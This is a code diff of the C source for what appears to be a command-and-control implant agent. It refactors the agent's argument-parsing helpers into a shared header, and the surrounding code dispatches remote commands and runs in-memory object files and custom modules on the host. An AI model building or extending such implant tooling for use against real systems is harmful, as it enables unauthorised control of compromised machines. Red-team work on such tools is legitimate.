@@ -21,6 +21,8 @@
 
 #include "protocol.h"
 
+#include "agent_args.h"
+
 #include "bof.h"
 #include "embedded_config.h"
 #include "gzip.h"
@@ -307,61 +309,6 @@ static void run_pwd(obuf *out) {
   }
 }
 
-/* Resolve the path argument of a filesystem command the way the Go agent's
- * cobra flags do: --dst/-d (or --path/-p), else the first positional arg,
- * else `def` (NULL means "empty"). */
-static void pick_path(const c2_str_list *cmd, size_t start, const char *def,
-                      char *out, size_t cap) {
-  out[0] = '\0';
-  int have_pos = 0;
-  for (size_t i = start; i < cmd->count; i++) {
-    c2_str a = cmd->items[i];
-    if (a.ptr == NULL || a.len == 0)
-      continue;
-    char tok[512];
-    size_t n = a.len < sizeof(tok) - 1 ? a.len : sizeof(tok) - 1;
-    memcpy(tok, a.ptr, n);
-    tok[n] = '\0';
-    int is_path_flag = strcmp(tok, "--dst") == 0 || strcmp(tok, "-d") == 0 ||
-                       strcmp(tok, "--path") == 0 || strcmp(tok, "-p") == 0;
-    if (is_path_flag) {
-      if (i + 1 < cmd->count) {
-        c2_str v = cmd->items[++i];
-        size_t vn = v.len < cap - 1 ? v.len : cap - 1;
-        memcpy(out, v.ptr, vn);
-        out[vn] = '\0';
-      }
-      continue;
-    }
-    if (strncmp(tok, "--dst=", 6) == 0 || strncmp(tok, "--path=", 7) == 0 ||
-        strncmp(tok, "-d=", 3) == 0 || strncmp(tok, "-p=", 3) == 0) {
-      const char *v = strchr(tok, '=') + 1;
-      snprintf(out, cap, "%s", v);
-      continue;
-    }
-    if (tok[0] == '-')
-      continue; /* unknown flag */
-    if (!have_pos) {
-      snprintf(out, cap, "%s", tok);
-      have_pos = 1;
-    }
-  }
-  if (out[0] == '\0' && def != NULL)
-    snprintf(out, cap, "%s", def);
-}
-
-/* Append command argument `n` (1-based, after the command name). */
-static void argn(const c2_str_list *cmd, size_t n, char *buf, size_t cap) {
-  buf[0] = '\0';
-  if (cmd->count <= n || cmd->items[n].ptr == NULL)
-    return;
-  size_t len = cmd->items[n].len;
-  if (len >= cap)
-    len = cap - 1;
-  memcpy(buf, cmd->items[n].ptr, len);
-  buf[len] = '\0';
-}
-
 static void run_mem_ls(const c2_memfile *mem, obuf *out) {
   for (size_t i = 0; i < c2_memfile_count(mem); i++) {
     const char *k = c2_memfile_key_at(mem, i);
@@ -482,39 +429,6 @@ static c2_status ensure_bof_loader(c2_agent_session *s, c2_memfile *mem) {
   return st;
 }
 
-/* `bof <object> [export] [args...]`: run a Linux relocatable BOF through the
- * coffloader_linux dependency. Args are prefixed tokens (i/s/z/Z/b); when the
- * first optional token starts with such a prefix it is an argument and the
- * export defaults to "go". */
-/* Value of `--name value` or `--name=value` from the command slice, or "". */
-static void pick_flag(const c2_str_list *cmd, const char *name, char *out,
-                      size_t cap) {
-  out[0] = '\0';
-  size_t nlen = strlen(name);
-  for (size_t i = 0; i < cmd->count; i++) {
-    c2_str a = cmd->items[i];
-    if (a.ptr == NULL || a.len == 0)
-      continue;
-    if (a.len > nlen && memcmp(a.ptr, name, nlen) == 0 && a.ptr[nlen] == '=') {
-      size_t vn = a.len - nlen - 1;
-      if (vn >= cap)
-        vn = cap - 1;
-      memcpy(out, a.ptr + nlen + 1, vn);
-      out[vn] = '\0';
-      return;
-    }
-    if (a.len == nlen && memcmp(a.ptr, name, nlen) == 0) {
-      if (i + 1 < cmd->count) {
-        c2_str v = cmd->items[++i];
-        size_t vn = v.len < cap - 1 ? v.len : cap - 1;
-        memcpy(out, v.ptr, vn);
-        out[vn] = '\0';
-      }
-      return;
-    }
-  }
-}
-
 /* Run one BOF object already in memory through the coffloader_linux
  * dependency. `tokens` are the packed-arg tokens c2_bof_pack_args consumes. */
 static void execute_bof(c2_agent_session *s, c2_memfile *mem,
@@ -565,12 +479,14 @@ static void execute_bof(c2_agent_session *s, c2_memfile *mem,
   free(loader);
 }
 
-/* `bof <object> [export] [args...]`: run a relocatable object already in
- * memfs. */
+/* `bof <object> [export] [args...]`: run a Linux relocatable BOF through the
+ * coffloader_linux dependency. Args are prefixed tokens (i/s/z/Z/b); when the
+ * first optional token starts with such a prefix it is an argument and the
+ * export defaults to "go". */
 static void run_bof(c2_agent_session *s, c2_memfile *mem,
                     const c2_str_list *cmd, obuf *out) {
   char object[512];
-  argn(cmd, 1, object, sizeof(object));
+  c2_cmd_argn(cmd, 1, object, sizeof(object));
   if (!object[0]) {
     obuf_append(out, "bof: missing object\n", 20);
     return;
@@ -615,10 +531,10 @@ static void run_custom_module(c2_agent_session *s, c2_memfile *mem,
   char type[32] = "";
   char file[512] = "";
   char checksum[128] = "";
-  pick_flag(cmd, "--mod_name", mod_name, sizeof(mod_name));
-  pick_flag(cmd, "--type", type, sizeof(type));
-  pick_flag(cmd, "--file_to_download", file, sizeof(file));
-  pick_flag(cmd, "--checksum", checksum, sizeof(checksum));
+  c2_cmd_pick_flag(cmd, "--mod_name", mod_name, sizeof(mod_name));
+  c2_cmd_pick_flag(cmd, "--type", type, sizeof(type));
+  c2_cmd_pick_flag(cmd, "--file_to_download", file, sizeof(file));
+  c2_cmd_pick_flag(cmd, "--checksum", checksum, sizeof(checksum));
 
   size_t inv_cap = 256u * 1024u;
   char *invocation = (char *)malloc(inv_cap);
@@ -626,7 +542,7 @@ static void run_custom_module(c2_agent_session *s, c2_memfile *mem,
     obuf_append(out, "custom_module: out of memory\n", 28);
     return;
   }
-  pick_flag(cmd, "--invocation", invocation, inv_cap);
+  c2_cmd_pick_flag(cmd, "--invocation", invocation, inv_cap);
 
   if (!c2_str_eq_ci(type, "coff")) {
     obuf_append(out, "custom_module: unsupported module type\n", 37);
@@ -740,19 +656,19 @@ static void dispatch(const c2_msgtun *m, c2_agent_session *s, c2_memfile *mem,
   }
 
   char arg[512], arg2[512];
-  argn(&m->cmd_slice, 1, arg, sizeof(arg));
-  argn(&m->cmd_slice, 2, arg2, sizeof(arg2));
+  c2_cmd_argn(&m->cmd_slice, 1, arg, sizeof(arg));
+  c2_cmd_argn(&m->cmd_slice, 2, arg2, sizeof(arg2));
 
   if (cmd_eq(name, "ls") || cmd_eq(name, "ls_dir")) {
-    pick_path(&m->cmd_slice, 1, ".", arg, sizeof(arg));
+    c2_cmd_pick_path(&m->cmd_slice, 1, ".", arg, sizeof(arg));
     run_ls(mem, arg, out);
   } else if (cmd_eq(name, "pwd")) {
     run_pwd(out);
   } else if (cmd_eq(name, "cd")) {
-    pick_path(&m->cmd_slice, 1, NULL, arg, sizeof(arg));
+    c2_cmd_pick_path(&m->cmd_slice, 1, NULL, arg, sizeof(arg));
     run_cd(arg, out);
   } else if (cmd_eq(name, "stat")) {
-    pick_path(&m->cmd_slice, 1, ".", arg, sizeof(arg));
+    c2_cmd_pick_path(&m->cmd_slice, 1, ".", arg, sizeof(arg));
     run_stat(arg, out);
   } else if (cmd_eq(name, "whoami")) {
     const char *u = getenv("USER");
@@ -781,7 +697,7 @@ static void dispatch(const c2_msgtun *m, c2_agent_session *s, c2_memfile *mem,
     else
       run_mem_read(mem, key, out);
   } else if (cmd_eq(name, "cat")) {
-    pick_path(&m->cmd_slice, 1, NULL, arg, sizeof(arg));
+    c2_cmd_pick_path(&m->cmd_slice, 1, NULL, arg, sizeof(arg));
     if (is_mem_path(arg))
       run_mem_read(mem, arg, out);
     else
